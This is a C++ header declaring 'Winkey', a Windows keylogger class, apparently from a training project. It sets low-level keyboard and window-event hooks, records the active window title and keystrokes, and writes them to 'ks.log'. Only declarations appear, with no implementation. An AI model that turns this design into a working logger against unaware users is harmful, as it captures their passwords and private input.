#ifndef WINKEY_H
# define WINKEY_H

# define UNICODE				// Use the wide-character (UTF-16) versions of APIs by default
# define _UNICODE				// tell C/C++ runtime and some helper macros to use wchar functions

# define WIN32_LEAN_AND_MEAN	// Reduces the number of included headers for
								// faster compile times; warnings may increase without it


/************************** Includes **************************/

# include <windows.h>
# include <iostream>
# include <fstream>
# include <string>
# include <iomanip>				// For std::setw and std::setfill
# include <thread>				// For sleep_for
# include <sstream>				// For error handling

// For wide characters
# include <locale>
# include <codecvt>


/************************** Macros **************************/

# define TW_LOGFILE			"ks.log"

# define TW_MAX_SAME_VK		10	// Max amount of repetitive vkCode
# define TW_WINTITLE_MAX	256
# define TW_KEYSTROKE_MAX	64


/************************** Class **************************/

class	Winkey
{
	public:

		Winkey();
		// Delete the copy constructor
		Winkey(const Winkey&) = delete;
		// Delete the copy assignment operator
		Winkey	&operator=(const Winkey&) = delete;
		~Winkey();

		void	setHooks(void);
		void	run(bool testMode);
		void	removeHooks(void);

	private:

		/*
		 * Windows hook callbacks such as:
		 *  - lowLevelKeyboardProc
		 *  - winEventProc
		 * must be static functions.
		 * 
		 * This is because Windows API requires callback functions to have C-style
		 * 	linkage, meaning:
		 *    - They cannot be class instance methods
		 * 	  - They cannot implicitly use `this`
		 * 	  - Windows will call them from outside  class context
		 * 
		 * Therefore, if the callback needs access to class data, that data must be static.
		 */

		static void				logToFile(void);

		static LRESULT CALLBACK	lowLevelKeyboardProc(
			const int nCode, const WPARAM wParam, const LPARAM lParam
		);
		static void CALLBACK	winEventProc(
			const HWINEVENTHOOK /*hWinEventHook*/, const DWORD event, const HWND hwnd,
			LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/
		);

		static bool				_testMode;
		static const char		*_logFileName;
		static std::wofstream	_logFile;
		static std::wstring		_windowTitle;
		static HWND				_currentWindow;
		static std::wstring		_keyStroke;
		HWINEVENTHOOK			_winEventHook;
		HHOOK   				_keyboardHook;
};


/************************** Exceptions **************************/

enum class WinkeyError {
	winEventHookFailure,
    keyboardHookFailure,
    FileOpenFailure
};

class WinkeyException : public std::exception {
public:
	/*
	 * @param code		Our custom error code
	 * @param msg		Our custom error message
	 * @param winErr	The Windows API error code (from GetLastError)
	 */
    WinkeyException(WinkeyError code, const std::string& msg, DWORD winErr = 0)
        : _code(code), _msg(msg), _winErr(winErr)
    {
        std::ostringstream oss;
        oss << "[WinkeyError " << static_cast<int>(code) << "]";
        if (winErr)
            oss << " [Win32:" << winErr << "]";
        oss << " " << msg;
        _formatted = oss.str();
    }

    const char*	what() const noexcept override { return _formatted.c_str(); }
    WinkeyError	code() const noexcept { return _code; }
    DWORD		winError() const noexcept { return _winErr; }

private:
    WinkeyError	_code;
    std::string	_msg;
    DWORD		_winErr;
    std::string	_formatted;
};


/************************** External Functions **************************/

std::wstring	getKeyName(const UINT vkCode);
bool			isPrintable(wchar_t c);

#endif
